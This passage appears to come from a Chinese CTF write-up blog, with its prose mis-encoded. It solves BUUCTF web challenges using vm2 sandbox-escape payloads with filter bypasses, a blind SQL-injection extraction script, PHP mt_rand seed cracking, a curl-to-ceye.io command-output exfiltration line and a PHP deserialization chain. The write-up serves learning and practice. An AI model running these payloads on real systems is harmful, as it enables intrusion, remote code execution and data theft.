alt="image-20220303201348464"></p><p>è®¿é—®ä¸€ä¸‹run.php</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220303201424600.png" alt="image-20220303201424600"></p><p>åˆšå¼€å§‹ä»¥ä¸ºæ˜¯phpçš„ä»£ç æ‰§è¡Œï¼Œä½†æ˜¯è¯•äº†è¯•æ²¡å•¥ååº”</p><p>ç„¶åå‘ç°è€ƒç‚¹æ˜¯jsçš„vm2é€ƒé€¸</p><p>å…ˆç”¨Error().stackçœ‹çœ‹ï¼ˆjsä¸­æ•è·å¼‚å¸¸å †æ ˆä¿¡æ¯</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220303201707379.png" alt="image-20220303201707379"></p><p>ç„¶åæ‰¾ä¸€ä¸‹vm2é€ƒé€¸çš„payload</p><p><a href="https://github.com/patriksimek/vm2/issues/225">Breakout in v3.8.3 Â· Issue #225 Â· patriksimek/vm2 (github.com)</a></p><pre class="language-none"><code class="language-none">try &#123;    Buffer.from(new Proxy(&#123;&#125;, &#123;        getOwnPropertyDescriptor()&#123;            throw f&#x3D;&gt;f[&#96;&#96;.concat(&#96;constr&#96;,&#96;uctor&#96;)](&#96;&#96;.concat(&#96;return pro&#96;,&#96;cess&#96;))();        &#125;    &#125;));&#125; catch(e) &#123;    e(()&#x3D;&gt;&#123;&#125;).mainModule.require(&#96;&#96;.concat(&#96;child_proc&#96;,&#96;ess&#96;))        [&#96;&#96;.concat(&#96;ex&#96;,&#96;ecSync&#96;)](&#96;cat package.json&#96;)&#125;</code></pre><p>æˆ–</p><pre class="language-none"><code class="language-none"> &#39;(&#39; + function()&#123;TypeError.prototype.get_process &#x3D; f&#x3D;&gt;f.constructor(&quot;return process&quot;)();try&#123;Object.preventExtensions(Buffer.from(&quot;&quot;)).a &#x3D; 1;&#125;catch(e)&#123;return e.get_process(()&#x3D;&gt;&#123;&#125;).mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString();&#125;&#125;+&#39;)()&#39;;try&#123;console.log(new VM().run(untrusted));&#125;catch(x)&#123;console.log(x);&#125;</code></pre><p>ä½†æ˜¯ç›´æ¥åˆ©ç”¨æœ‰waf</p><p>[&#39;for&#39;, &#39;while&#39;, &#39;process&#39;, &#39;exec&#39;, &#39;eval&#39;, &#39;constructor&#39;, &#39;prototype&#39;, &#39;Function&#39;, &#39;+&#39;, &#39;&quot;&#39;,&#39;&#39;&#39;]</p><p>æ‰€ä»¥é€šè¿‡åœ¨å…³é”®å­—å­—æ¯ä¸ŠåŠ ä¸Š ` è¿›è¡Œç»•è¿‡</p><pre class="language-none"><code class="language-none">&#x2F;run.php?code&#x3D;(()&#x3D;%3E&#123;%20TypeError[[&#96;p&#96;,&#96;r&#96;,&#96;o&#96;,&#96;t&#96;,&#96;o&#96;,&#96;t&#96;,&#96;y&#96;,&#96;p&#96;,&#96;e&#96;][&#96;join&#96;](&#96;&#96;)][&#96;a&#96;]%20&#x3D;%20f&#x3D;%3Ef[[&#96;c&#96;,&#96;o&#96;,&#96;n&#96;,&#96;s&#96;,&#96;t&#96;,&#96;r&#96;,&#96;u&#96;,&#96;c&#96;,&#96;t&#96;,&#96;o&#96;,&#96;r&#96;][&#96;join&#96;](&#96;&#96;)]([&#96;r&#96;,&#96;e&#96;,&#96;t&#96;,&#96;u&#96;,&#96;r&#96;,&#96;n&#96;,&#96;%20&#96;,&#96;p&#96;,&#96;r&#96;,&#96;o&#96;,&#96;c&#96;,&#96;e&#96;,&#96;s&#96;,&#96;s&#96;][&#96;join&#96;](&#96;&#96;))();%20try&#123;%20Object[&#96;preventExtensions&#96;](Buffer[&#96;from&#96;](&#96;&#96;))[&#96;a&#96;]%20&#x3D;%201;%20&#125;catch(e)&#123;%20return%20e[&#96;a&#96;](()&#x3D;%3E&#123;&#125;)[&#96;mainModule&#96;][[&#96;r&#96;,&#96;e&#96;,&#96;q&#96;,&#96;u&#96;,&#96;i&#96;,&#96;r&#96;,&#96;e&#96;][&#96;join&#96;](&#96;&#96;)]([&#96;c&#96;,&#96;h&#96;,&#96;i&#96;,&#96;l&#96;,&#96;d&#96;,&#96;_&#96;,&#96;p&#96;,&#96;r&#96;,&#96;o&#96;,&#96;c&#96;,&#96;e&#96;,&#96;s&#96;,&#96;s&#96;][&#96;join&#96;](&#96;&#96;))[[&#96;e&#96;,&#96;x&#96;,&#96;e&#96;,&#96;c&#96;,&#96;S&#96;,&#96;y&#96;,&#96;n&#96;,&#96;c&#96;][&#96;join&#96;](&#96;&#96;)](&#96;cat+%2fflag&#96;)[&#96;toString&#96;]();%20&#125;%20&#125;)()</code></pre><p>joinçš„ä½œç”¨ï¼š</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220303203448082.png" alt="image-20220303203448082"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220303203626377.png" alt="image-20220303203626377"></p><p>è¿˜æœ‰å¦ä¸€ç§ç»•è¿‡æ–¹å¼</p><pre class="language-jsx" data-language="jsx"><code class="language-jsx">&#96;$&#123;&#96;$&#123;&#96;prototyp&#96;&#125;e&#96;&#125;&#96;</code></pre><p>æŠŠæ‰€æœ‰è¢«è¿‡æ»¤çš„å­—ç¬¦æŒ‰è¿™ä¸ªæ–¹å¼æ”¹å†™å°±è¡Œ</p><pre class="language-none"><code class="language-none">(function ()&#123;    TypeError[&#96;$&#123;&#96;$&#123;&#96;prototyp&#96;&#125;e&#96;&#125;&#96;][&#96;$&#123;&#96;$&#123;&#96;get_proces&#96;&#125;s&#96;&#125;&#96;] &#x3D; f&#x3D;&gt;f[&#96;$&#123;&#96;$&#123;&#96;constructo&#96;&#125;r&#96;&#125;&#96;](&#96;$&#123;&#96;$&#123;&#96;return this.proces&#96;&#125;s&#96;&#125;&#96;)();    try&#123;        Object.preventExtensions(Buffer.from(&#96;&#96;)).a &#x3D; 1;    &#125;catch(e)&#123;        return e[&#96;$&#123;&#96;$&#123;&#96;get_proces&#96;&#125;s&#96;&#125;&#96;](()&#x3D;&gt;&#123;&#125;).mainModule[&#96;$&#123;&#96;$&#123;&#96;requir&#96;&#125;e&#96;&#125;&#96;](&#96;$&#123;&#96;$&#123;&#96;child_proces&#96;&#125;s&#96;&#125;&#96;)[&#96;$&#123;&#96;$&#123;&#96;exe&#96;&#125;cSync&#96;&#125;&#96;](&#96;cat &#x2F;flag&#96;).toString();    &#125;&#125;)()</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220303204954125.png" alt="image-20220303204954125"></p><h2 id="ç½‘é¼æ¯2018-Unfinish"><a href="#ç½‘é¼æ¯2018-Unfinish" class="headerlink" title="[ç½‘é¼æ¯2018]Unfinish"></a>[ç½‘é¼æ¯2018]Unfinish</h2><p>è¿›å…¥ä¹‹åæ˜¯login.phpç•Œé¢ï¼Œæœ‰loginé‚£è‚¯å®šä¹Ÿæœ‰register.phpï¼Œè®¿é—®ä¸€ä¸‹ç„¶åæ³¨å†Œä¸ªç”¨æˆ·ï¼Œå†ç™»å½•</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220303215431763.png" alt="image-20220303215431763"></p><p>æ•´ä¸ªé¡µé¢é™¤äº†è¿™ä¸ªç”¨æˆ·åå…¶ä»–æ²¡æœ‰ä»»ä½•æœ‰ç”¨çš„åœ°æ–¹ï¼Œäºæ˜¯çŒœæµ‹æ˜¯äºŒæ¬¡æ³¨å…¥</p><p>informationï¼Œé€—å·è¿˜æœ‰å…¶ä»–å¾ˆå¤šéƒ½è¢«è¿‡æ»¤äº†</p><p>åªèƒ½ç”¨from forä»£æ›¿é€—å·ï¼Œç›´æ¥çŒœè¡¨åæ˜¯flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220517171510356.png" alt="image-20220517171510356"></p><p>ç¡®å®šä¹‹åå†™è„šæœ¬è·‘flag</p><pre class="language-python" data-language="python"><code class="language-python">import refrom time import sleepimport requestsflag &#x3D; &#39;&#39;url &#x3D; &#39;http:&#x2F;&#x2F;a5568bf9-7958-451d-8e61-3e7dc9fa8556.node4.buuoj.cn:81&#x2F;&#39;payload &#x3D; &#39;0+ascii(substr((select * from flag) from &#123;&#125; for 1))&#39;for i in range(1000):    sleep(0.3)    data &#x3D; &#123;&quot;email&quot;: &quot;1234&#123;&#125;@123.com&quot;.format(i),            &quot;username&quot;: &quot;0&#39;+ascii(substr((select * from flag) from &#123;&#125; for 1))--+&quot;.format(i), &quot;password&quot;: &quot;123&quot;&#125;    data1 &#x3D; &#123;&quot;email&quot;: &quot;1234&#123;&#125;@123.com&quot;.format(i), &quot;password&quot;: &quot;123&quot;&#125;    requests.post(url&#x3D;url + &#39;register.php&#39;, data&#x3D;data)    r2 &#x3D; requests.post(url&#x3D;url + &#39;login.php&#39;, data&#x3D;data1)    res &#x3D; re.search(r&#39;&lt;span class&#x3D;&quot;user-name&quot;&gt;\s*(\d*)\s*&lt;&#x2F;span&gt;&#39;, r2.text)    res1 &#x3D; re.search(r&#39;\d+&#39;, res.group())    flag &#x3D; flag + chr(int(res1.group()))    print(flag)</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220303215646816.png" alt="image-20220303215646816"></p><h2 id="GXYCTF2019-StrongestMind"><a href="#GXYCTF2019-StrongestMind" class="headerlink" title="[GXYCTF2019]StrongestMind"></a>[GXYCTF2019]StrongestMind</h2><p>å†™è„šæœ¬æ‰§è¡Œè¿ç®—å°±è¡Œ</p><pre class="language-none"><code class="language-none">import reimport requestsfrom time import sleep#url &#x3D; &#39;http:&#x2F;&#x2F;e7e29bd6-320e-4016-b8be-63f714c813ec.node4.buuoj.cn:81&#x2F;index.php&#39;req &#x3D; requests.session()response &#x3D; req.get(url)for i in range(1001):    math &#x3D; re.search(r&#39;[0-9]+ [+|-] [0-9]+&#39;, response.text)    data &#x3D; &#123;&quot;answer&quot; : eval(math.group())&#125;    response &#x3D; req.post(url, data&#x3D;data)    print(i,data)    response.encoding &#x3D; &quot;utf-8&quot;    print(response.text)    sleep(0.1)</code></pre><p>å”¯ä¸€è¦æ³¨æ„çš„å°±æ˜¯è¦å…ˆç”¨request.session()ä¿æŒä¼šè¯</p><h2 id="MRCTF2020-Ezaudit"><a href="#MRCTF2020-Ezaudit" class="headerlink" title="[MRCTF2020]Ezaudit"></a>[MRCTF2020]Ezaudit</h2><p>phpçš„ä¼ªéšæœºï¼Œå’Œå‰è¾¹ä¸€é“é¢˜å¾ˆåƒ</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220306160421431.png" alt="image-20220306160421431"></p><p>çœ‹åˆ°<a href="http://www.zip,ä¸‹è½½ä¸‹æ¥çœ‹çœ‹æºç /">www.zipï¼Œä¸‹è½½ä¸‹æ¥çœ‹çœ‹æºç </a></p><pre class="language-none"><code class="language-none">if(isset($_POST[&#39;login&#39;]))&#123;    $username &#x3D; $_POST[&#39;username&#39;];    $password &#x3D; $_POST[&#39;password&#39;];    $Private_key &#x3D; $_POST[&#39;Private_key&#39;];    if (($username &#x3D;&#x3D; &#39;&#39;) || ($password &#x3D;&#x3D; &#39;&#39;) ||($Private_key &#x3D;&#x3D; &#39;&#39;)) &#123;        &#x2F;&#x2F; è‹¥ä¸ºç©º,è§†ä¸ºæœªå¡«å†™,æç¤ºé”™è¯¯,å¹¶3ç§’åè¿”å›ç™»å½•ç•Œé¢        header(&#39;refresh:2; url&#x3D;login.html&#39;);        echo &quot;ç”¨æˆ·åã€å¯†ç ã€å¯†é’¥ä¸èƒ½ä¸ºç©ºå•¦,crisprä¼šè®©ä½ åœ¨2ç§’åè·³è½¬åˆ°ç™»å½•ç•Œé¢çš„!&quot;;        exit;    &#125;    else if($Private_key !&#x3D; &#39;*************&#39; )    &#123;        header(&#39;refresh:2; url&#x3D;login.html&#39;);        echo &quot;å‡å¯†é’¥ï¼Œå’‹ä¼šè®©ä½ ç™»å½•?crisprä¼šè®©ä½ åœ¨2ç§’åè·³è½¬åˆ°ç™»å½•ç•Œé¢çš„!&quot;;        exit;    &#125;    else&#123;        if($Private_key &#x3D;&#x3D;&#x3D; &#39;************&#39;)&#123;            $getuser &#x3D; &quot;SELECT flag FROM user WHERE username&#x3D; &#39;crispr&#39; AND password &#x3D; &#39;$password&#39;&quot;.&#39;;&#39;;            $link&#x3D;mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;);            mysql_select_db(&quot;test&quot;,$link);            $result &#x3D; mysql_query($getuser);            while($row&#x3D;mysql_fetch_assoc($result))&#123;                echo &quot;&lt;tr&gt;&lt;td&gt;&quot;.$row[&quot;username&quot;].&quot;&lt;&#x2F;td&gt;&lt;td&gt;&quot;.$row[&quot;flag&quot;].&quot;&lt;&#x2F;td&gt;&lt;td&gt;&quot;;            &#125;        &#125;    &#125;&#125;&#x2F;&#x2F; genarate public_keyfunction public_key($length &#x3D; 16) &#123;    $strings1 &#x3D; &#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#39;;    $public_key &#x3D; &#39;&#39;;    for ( $i &#x3D; 0; $i &lt; $length; $i++ )        $public_key .&#x3D; substr($strings1, mt_rand(0, strlen($strings1) - 1), 1);    return $public_key;&#125;&#x2F;&#x2F;genarate private_keyfunction private_key($length &#x3D; 12) &#123;    $strings2 &#x3D; &#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#39;;    $private_key &#x3D; &#39;&#39;;    for ( $i &#x3D; 0; $i &lt; $length; $i++ )        $private_key .&#x3D; substr($strings2, mt_rand(0, strlen($strings2) - 1), 1);    return $private_key;&#125;$Public_key &#x3D; public_key();&#x2F;&#x2F;$Public_key &#x3D; KVQP0LdJKRaV3n9D  how to get crispr&#39;s private_key???</code></pre><p>ç»™äº†ä¸€ä¸ªå…¬é’¥ï¼Œæˆ‘ä»¬æ¥è¯•è¯•æ±‚ç§é’¥</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220306160642065.png" alt="image-20220306160642065"></p><p>ä¸¤ä¸ªè„šæœ¬ç”¨é‚£ä¸ªéƒ½è¡Œï¼ŒæŠŠè¾“å‡ºçš„ç»“æœæ”¾åˆ°php_mt_seedé‡Œæ±‚æ±‚ç§å­</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220306160739487.png" alt="image-20220306160739487"></p><p>å¾—åˆ°ç§å­ä¹‹åå°±èƒ½å¾—åˆ°ç§é’¥çš„å€¼äº†</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220306161532376.png" alt="image-20220306161532376"></p><p>å¯¹äºå¯†ç è¿™éƒ¨åˆ†å¯ä»¥ç›´æ¥ç”¨ä¸‡èƒ½å¯†ç </p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220306161615805.png" alt="image-20220306161615805"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220306161558813.png" alt="image-20220306161558813"></p><p>ç™»å½•æ‹¿åˆ°flag</p><h2 id="ç½‘é¼æ¯-track-hacker"><a href="#ç½‘é¼æ¯-track-hacker" class="headerlink" title="[ç½‘é¼æ¯]track_hacker"></a>[ç½‘é¼æ¯]track_hacker</h2><p>ä¸æ˜¯buuçš„é¢˜ï¼Œä¹Ÿæ²¡å•¥éš¾åº¦ï¼Œå°±æ˜¯è®°å½•ä¸€ä¸‹è¿™ç§è§£ç çš„æ–¹å¼</p><p>ç”¨python2è§£ç </p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220313151128218.png" alt="image-20220313151128218"></p><p>å¦‚æœç”¨python3è¦ç”¨è¿™ç§å†™æ³•</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220313151354257.png" alt="image-20220313151354257"></p><h2 id="duangShell"><a href="#duangShell" class="headerlink" title="duangShell"></a>duangShell</h2><p>ä¸»è¦æ˜¯è®°å½•ä¸€ä¸‹åˆ©ç”¨dnslogå¤–å¸¦çš„æ–¹æ³•</p><pre class="language-none"><code class="language-none">&lt;!DOCTYPE html&gt;&lt;html lang&#x3D;&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;    &lt;title&gt;give me a girl&lt;&#x2F;title&gt;&lt;&#x2F;head&gt;&lt;body&gt;    &lt;center&gt;&lt;h1&gt;ççˆ±ç½‘&lt;&#x2F;h1&gt;&lt;&#x2F;center&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;&lt;?phperror_reporting(0);echo &quot;how can i give you source code? .swp?!&quot;.&quot;&lt;br&gt;&quot;;if (!isset($_POST[&#39;girl_friend&#39;])) &#123;    die(&quot;where is P3rh4ps&#39;s girl friend ???&quot;);&#125; else &#123;    $girl &#x3D; $_POST[&#39;girl_friend&#39;];    if (preg_match(&#39;&#x2F;\&gt;|\\\&#x2F;&#39;, $girl)) &#123;        die(&#39;just girl&#39;);    &#125; else if (preg_match(&#39;&#x2F;ls|phpinfo|cat|\%|\^|\~|base64|xxd|echo|\$&#x2F;i&#39;, $girl)) &#123;        echo &quot;&lt;img src&#x3D;&#39;img&#x2F;p3_need_beautiful_gf.png&#39;&gt; &lt;!-- He is p3 --&gt;&quot;;    &#125; else &#123;        &#x2F;&#x2F;duangShell~~~~        exec($girl);    &#125;&#125;</code></pre><p>å¯ä»¥çœ‹åˆ°postçš„girl_friendå€¼ç»•è¿‡è¿‡æ»¤ä¹‹åç›´æ¥å‘½ä»¤æ‰§è¡Œï¼Œä½†æ˜¯è¿™é‡Œæ˜¯execä¸å­˜åœ¨å›æ˜¾ï¼Œæ‰€ä»¥å¯ä»¥è¿›è¡Œåå¼¹shellï¼Œæˆ–è€…åˆ©ç”¨dnslogå¤–å¸¦å‘½ä»¤</p><p><a href="http://ceye.io/">http://ceye.io/</a></p><pre class="language-none"><code class="language-none">curl http:&#x2F;&#x2F;xxx.ceye.io&#x2F;&#96;åå¼•å·å†…æ‰§è¡Œå‘½ä»¤&#96;</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220313181954261.png" alt="image-20220313181954261"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220313183153676.png" alt="image-20220313183153676"></p><p>æ—¢ç„¶èƒ½æ‰§è¡Œå‘½ä»¤ï¼Œé‚£æˆ‘ä»¬å°±å¯ä»¥ç”¨findæ‰¾flagæ–‡ä»¶åç„¶åæŸ¥çœ‹ï¼Œæˆ–è€…ç›´æ¥grepæ‰¾å†…å®¹ï¼Œä½†æ˜¯å¦‚æœä»æ ¹ç›®å½•å¼€å§‹æ‰¾buuçš„é¶æœºå¥½åƒè·‘ä¸åŠ¨ï¼Œä¼šæ˜¾ç¤ºè¶…æ—¶</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220313182203224.png" alt="image-20220313182203224"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220313183232302.png" alt="image-20220313183232302"></p><p>æˆ–è€…ç”¨grepç›´æ¥å¸¦å‡ºflag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220313182614407.png" alt="image-20220313182614407"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220313183120462.png" alt="image-20220313183120462"></p><p>æ³¨æ„çš„æ˜¯è¿™ç§å¤–å¸¦ä¸€æ¬¡åªèƒ½æ˜¾ç¤ºä¸€æ¡æ•°æ®ï¼Œæ‰€ä»¥å¯èƒ½ä¼šåŒ¹é…åˆ°å…¶ä»–çš„æ–‡ä»¶ï¼Œå¦‚æœæƒ³æŸ¥çœ‹å…¶ä»–æ•°æ®ï¼Œå°±è¦åˆ©ç”¨sedå‘½ä»¤</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220313182834749.png" alt="image-20220313182834749"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220313183347193.png" alt="image-20220313183347193"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220313182858820.png" alt="image-20220313182858820"></p><p>tipsï¼šè¿™ç§æ–¹æ³•å¯ä»¥ç”¨äºsqlç›²æ³¨ï¼Œä½†æ˜¯å‰ææ˜¯å¿…é¡»æœ‰FILEæƒé™ã€secure_file_privä¸ºç©ºè€Œä¸æ˜¯NULLï¼ˆä¸ä¸ºç©ºå°±åªèƒ½è¯»é™å®šç›®å½•çš„æ–‡ä»¶ï¼‰</p><h2 id="GYCTF2020-Easyphp"><a href="#GYCTF2020-Easyphp" class="headerlink" title="[GYCTF2020]Easyphp"></a>[GYCTF2020]Easyphp</h2><p>åœ¨updateç•Œé¢ï¼Œå³ä½¿æ²¡æœ‰æˆåŠŸç™»å½•ä¹Ÿä¼šç»§ç»­æ‰§è¡Œä¸‹é¢çš„è°ƒç”¨updateæ–¹æ³•çš„è¯­å¥    </p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220317214149049.png" alt="image-20220317214149049"></p><p>é‡ç‚¹åœ¨lib.phpä¸­ï¼Œè¿™é‡Œé¢æœ‰ä¸¤ä¸ª__destructæ–¹æ³•ï¼Œæˆ‘ä»¬è¦åˆ©ç”¨çš„æ˜¯UpdateHelperç±»ä¸­çš„__destruct,è¿™æ˜¯æˆ‘ä»¬ååºåˆ—åŒ–çš„èµ·ç‚¹</p><p>ä½†æ˜¯æˆ‘ä»¬å…ˆæ¥çœ‹çœ‹dbCtrlç±»</p><pre class="language-none"><code class="language-none">class dbCtrl&#123;    public $hostname&#x3D;&quot;127.0.0.1&quot;;    public $dbuser&#x3D;&quot;root&quot;;    public $dbpass&#x3D;&quot;root&quot;;    public $database&#x3D;&quot;test&quot;;    public $name;    public $password;    public $mysqli;    public $token;    public function __construct()    &#123;        $this-&gt;name&#x3D;$_POST[&#39;username&#39;];        $this-&gt;password&#x3D;$_POST[&#39;password&#39;];        $this-&gt;token&#x3D;$_SESSION[&#39;token&#39;];    &#125;    public function login($sql)    &#123;        $this-&gt;mysqli&#x3D;new mysqli($this-&gt;hostname, $this-&gt;dbuser, $this-&gt;dbpass, $this-&gt;database);        if ($this-&gt;mysqli-&gt;connect_error) &#123;            die(&quot;è¿æ¥å¤±è´¥ï¼Œé”™è¯¯:&quot; . $this-&gt;mysqli-&gt;connect_error);        &#125;        $result&#x3D;$this-&gt;mysqli-&gt;prepare($sql);        $result-&gt;bind_param(&#39;s&#39;, $this-&gt;name);        $result-&gt;execute();        $result-&gt;bind_result($idResult, $passwordResult);        $result-&gt;fetch();        $result-&gt;close();        if ($this-&gt;token&#x3D;&#x3D;&#39;admin&#39;) &#123;            return $idResult;        &#125;        if (!$idResult) &#123;            echo(&#39;ç”¨æˆ·ä¸å­˜åœ¨!&#39;);            return false;        &#125;        if (md5($this-&gt;password)!&#x3D;&#x3D;$passwordResult) &#123;            echo(&#39;å¯†ç é”™è¯¯ï¼&#39;);            return false;        &#125;        $_SESSION[&#39;token&#39;]&#x3D;$this-&gt;name;        return $idResult;    &#125;    public function update($sql)    &#123;        &#x2F;&#x2F;è¿˜æ²¡æ¥å¾—åŠå†™    &#125;&#125;</code></pre><p>èƒ½çœ‹å‡ºæ•°æ®åº“ä¸­æ˜¯å­˜åœ¨adminç”¨æˆ·çš„ï¼Œä½†æ˜¯å¯†ç æˆ‘ä»¬ä¸çŸ¥é“ï¼Œè¿™é‡Œçš„sqlæŸ¥è¯¢è¯­å¥ä¸º<code>select id,password from user where username=?</code><br>å¦‚æœèƒ½æ§åˆ¶è¿™é‡Œçš„sqlæ‰§è¡Œè¯­å¥ä¸º<br><code>select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username=?</code>ä¾¿å¯ç»è¿‡ç™»é™†çš„å¯†ç éªŒè¯ï¼Œè¿™ä¸ªæ“ä½œæ˜¯å¯ä»¥å®ç°çš„<br>c4ca4238a0b923820dcc509a6f75849bæ˜¯1çš„MD5å€¼</p><p>è¿™æ˜¯sqlåˆ›é€ ä¸´æ—¶åˆ—çš„ä¸€ç§æ–¹æ³•ï¼Œå¦‚æœæŸ¥è¯¢çš„å‚æ•°ä¸å­˜åœ¨ï¼Œé‚£å°±ä¼šåˆ›å»ºä¸€ä¸ªä¸´æ—¶çš„åˆ—ï¼Œå¹¶ä¸”è®¾ç½®è¯¥åˆ—æ‰€æœ‰å‚æ•°éƒ½æ˜¯æŸ¥è¯¢çš„å‚æ•°ã€‚æ‰€ä»¥æ•´ä¸ªpayloadè¯­å¥çš„æ„æ€å°±æ˜¯æŸ¥è¯¢æ‰€æœ‰æ•°æ®ï¼Œç„¶åå¢åŠ äº†ä¸€ä¸ªä¸´æ—¶åˆ—ï¼Œç¬¬ä¸€åˆ—æ˜¯æ•°æ®åº“ä¸­çš„æ•°æ®ï¼Œç¬¬äºŒåˆ—æ˜¯æ·»åŠ çš„ä¸´æ—¶åˆ—1</p><pre class="language-php" data-language="php"><code class="language-php">class User&#123;    public $id;    public $age&#x3D;null;    public $nickname&#x3D;null;    public function login() &#123;        if(isset($_POST[&#39;username&#39;])&amp;&amp;isset($_POST[&#39;password&#39;]))&#123;        $mysqli&#x3D;new dbCtrl();        $this-&gt;id&#x3D;$mysqli-&gt;login(&#39;select id,password from user where username&#x3D;?&#39;);        if($this-&gt;id)&#123;        $_SESSION[&#39;id&#39;]&#x3D;$this-&gt;id;        $_SESSION[&#39;login&#39;]&#x3D;1;        echo &quot;ä½ çš„IDæ˜¯&quot;.$_SESSION[&#39;id&#39;];        echo &quot;ä½ å¥½ï¼&quot;.$_SESSION[&#39;token&#39;];        echo &quot;&lt;script&gt;window.location.href&#x3D;&#39;.&#x2F;update.php&#39;&lt;&#x2F;script&gt;&quot;;        return $this-&gt;id;        &#125;    &#125;&#125;    public function update()&#123;        $Info&#x3D;unserialize($this-&gt;getNewinfo());        $age&#x3D;$Info-&gt;age;        $nickname&#x3D;$Info-&gt;nickname;        $updateAction&#x3D;new UpdateHelper($_SESSION[&#39;id&#39;],$Info,&quot;update user SET age&#x3D;$age,nickname&#x3D;$nickname where id&#x3D;&quot;.$_SESSION[&#39;id&#39;]);        &#x2F;&#x2F;è¿™ä¸ªåŠŸèƒ½è¿˜æ²¡æœ‰å†™å®Œ å…ˆå å‘    &#125;    public function getNewInfo()&#123;        $age&#x3D;$_POST[&#39;age&#39;];        $nickname&#x3D;$_POST[&#39;nickname&#39;];        return safe(serialize(new Info($age,$nickname)));    &#125;    public function __destruct()&#123;        return file_get_contents($this-&gt;nickname);&#x2F;&#x2F;å±    &#125;    public function __toString()    &#123;        $this-&gt;nickname-&gt;update($this-&gt;age);&#x2F;&#x2F;è¿™é‡Œå¦‚æœæˆ‘ä»¬å°†nicknameå®ä¾‹åŒ–ä¸ºinfoç±»çš„å¯¹è±¡ï¼Œé‚£ä¹ˆtostringæ‰§è¡Œçš„æ—¶å€™å°±ç›¸å½“äºè°ƒç”¨ä¸€ä¸ªinfoç±»ä¸­ä¸å­˜åœ¨çš„æ–¹æ³•ï¼Œä¹Ÿå°±ä¼šè°ƒç”¨infoç±»ä¸­çš„__callæ–¹æ³•        return &quot;0-0&quot;;    &#125;&#125;class Info&#123;    public $age;    public $nickname;    public $CtrlCase;    public 